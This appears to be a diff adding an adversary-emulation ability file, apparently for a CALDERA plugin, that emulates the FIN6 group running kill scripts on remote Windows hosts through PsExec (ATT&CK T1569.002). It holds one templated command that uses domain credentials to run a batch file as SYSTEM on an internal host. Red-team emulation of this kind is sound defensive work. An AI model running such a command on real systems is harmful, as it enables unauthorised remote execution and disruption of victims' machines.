@@ -1,0 +1,32 @@
+ability_id: 0c752dce-9302-4465-805f-522650aece3f
+access: {}
+additional_info: {}
+buckets:
+- execution
+delete_payload: true
+description: FIN6 has utilized PsExec to execute kill scripts on intended targets
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password}
+    -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}'
+  language: null
+  name: cmd
+  parsers: []
+  payloads:
+  - psexec.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Execute Kill Scripts via PsExec
+plugin: emu
+privilege: Elevated
+repeatable: false
+requirements: []
+singleton: false
+tactic: execution
+technique_id: T1569.002
+technique_name: 'System Services: Service Execution'
